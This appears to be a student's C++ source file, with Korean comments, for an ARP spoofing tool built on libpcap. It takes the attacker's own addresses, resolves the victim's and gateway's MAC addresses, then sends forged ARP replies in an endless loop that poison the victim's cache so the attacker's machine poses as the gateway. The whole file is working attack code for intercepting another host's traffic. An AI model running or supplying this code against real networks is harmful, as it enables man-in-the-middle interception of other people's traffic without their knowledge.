#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/socket.h> // socket
#include <sys/ioctl.h> // ioctl
#include <net/if.h> // hw info struct
#include <unistd.h> // close

#pragma pack(push,1)
struct arp_protocol{
   uint8_t dest_mac[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
   uint8_t src_mac[6];
   uint8_t type[2]={0x08,0x06};
   // ether2
   uint8_t hardware_type[2]={0x00,0x01};
   uint8_t protocol_type[2]={0x08,0x00};
   uint8_t hardware_size=0x06;
   uint8_t protocol_size=0x04;
   uint8_t opcode[2]={0x00,0x01};
   uint8_t sender_mac[6];
   uint8_t sender_ip[4];
   uint8_t target_mac[6]={0x00,0x00,0x0,0x00,0x00,0x00};
   uint8_t target_ip[4];
   // arp
};

struct property{
    uint8_t ip[4];
    uint8_t mac[6];
};

struct network_config{
    struct property attacker;
    struct property victim;
    struct property gateway;
};

#pragma pack(pop)

struct arp_protocol arp_req;
struct network_config network;

void str2int(bool choice, char data[15]){
    uint8_t ip_int[4]={0,};
    int i,index=0,sum=0, dot_count=3;
    bool check=false;

    for (i=15;i>=0;i--){
        if (data[i] == 0x00) {
            check = true;
            i--;
        }

        if (check){
            if (data[i] != '.'){
                index = index + 1;
                switch (index){
                    case 1:
                        sum = sum + data[i] - 48;
                        break;
                    case 2:
                        sum = sum + (data[i] - 48) * 10;
                        break;
                    case 3:
                        sum = sum + (data[i] - 48) * 100;
                        break;
                }
            } else {
                ip_int[dot_count] = sum;
                index=0;
                sum=0;
                dot_count--;
            }
        }
    }
    ip_int[0] = sum;

    if (choice){
        memcpy(network.victim.ip, ip_int, 4);
    } else {
        memcpy(network.gateway.ip, ip_int, 4);
    }
}

void usage() {
    printf("syntax: arp-test <interface>\n");
    printf("sample: arp-test wlan0\n");
} // 사용 예시 출력 함수.

void get_remote_mac(bool choice, pcap_t* handle){
    memcpy(arp_req.src_mac, network.attacker.mac, 6);
    memcpy(arp_req.sender_mac, network.attacker.mac, 6);
    memcpy(arp_req.sender_ip, network.attacker.ip, 4);
    if (choice) {
        memcpy(arp_req.target_ip, network.victim.ip, 4);
    } else {
        memcpy(arp_req.target_ip, network.gateway.ip, 4);
    }

    pcap_sendpacket(handle,(unsigned char*)&arp_req,sizeof(arp_req));
    // send first arp req

    struct arp_protocol* arp_res;
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;

        int res = pcap_next_ex(handle, &header, &packet);
        // 다음 패킷을 잡고 성공시 1을 반환한다.
        if (res == 0) continue; // timeout이 만기될 경우(0), 다시 패킷을 잡는다.
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        } // 에러와(-1), EOF(-2)시 루프를 종료한다.

        arp_res = (struct arp_protocol *)packet;
        if ((arp_res->type[0] == 0x08) && (arp_res->type[1] == 0x06)){
            printf("pass1\n");
            if (memcmp(arp_res->sender_ip, arp_req.target_ip, 4)==0){
                printf("pass2\n");
                if (arp_res->opcode[1] == 0x02){
                    printf("pass3\n");
                    if (choice){
                        memcpy(network.victim.mac, arp_res->sender_mac, 6);
                    } else {
                        memcpy(network.gateway.mac, arp_res->sender_mac, 6);
                    }
                    break;
                }
            }
        }
    }
}


int main(int argc, char* argv[]) {
    if (argc < 4) {
        usage();
        return -1;
    } // 인자 값이 2가 아니면 사용 예시 출력 후 비정상 종료.

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    // 인자 값으로 받은 네트워크 장치를 사용해 promiscuous 모드로 pcap를 연다.

    if (handle == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
        return -1;
    } // 열지 못하면 메세지 출력 후 비정상 종료.

    int sockfd, ret;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0) {
      printf("Fail to get interface MAC address - socket() failed - %m\n");
      return -1;
    }
    // socket

    struct ifreq ifr;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    memcpy(network.attacker.mac, ifr.ifr_hwaddr.sa_data, 6);
    // attacker mac
    ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
    memcpy(network.attacker.ip, ifr.ifr_addr.sa_data+2, 4);
    // attacker ip
    close(sockfd);
    if (ret < 0) {
      printf("Fail to get interface info.\n");
      return -1;
    }

    str2int(true, argv[2]); // victim ip
    get_remote_mac(true, handle); // victim mac
    str2int(false, argv[3]);// gateway ip
    get_remote_mac(false, handle);// victim mac

    printf("%d.%d.%d.%d\n",network.victim.ip[0],network.victim.ip[1],
            network.victim.ip[2], network.victim.ip[3]);
    printf("%d.%d.%d.%d\n",network.gateway.ip[0],network.gateway.ip[1],
            network.gateway.ip[2], network.gateway.ip[3]);
    printf("%X:%X:%X:%X:%X:%X\n",network.victim.mac[0],network.victim.mac[1],network.victim.mac[2],
            network.victim.mac[3],network.victim.mac[4],network.victim.mac[5]);
    printf("%X:%X:%X:%X:%X:%X\n",network.gateway.mac[0],network.gateway.mac[1],network.gateway.mac[2],
            network.gateway.mac[3],network.gateway.mac[4],network.gateway.mac[5]);
    // print

    memcpy(arp_req.src_mac, network.gateway.mac, 6);
    memcpy(arp_req.dest_mac, network.victim.mac, 6);
    memcpy(arp_req.sender_mac, network.attacker.mac, 6);
    memcpy(arp_req.sender_ip, network.gateway.ip, 4);
    memcpy(arp_req.target_ip, network.victim.ip, 4);
    arp_req.opcode[1] = 0x02;

    while (1){
        pcap_sendpacket(handle,(unsigned char*)&arp_req,sizeof(arp_req));
    }


    pcap_close(handle);
    // pcap 핸들을 닫아준다.
}
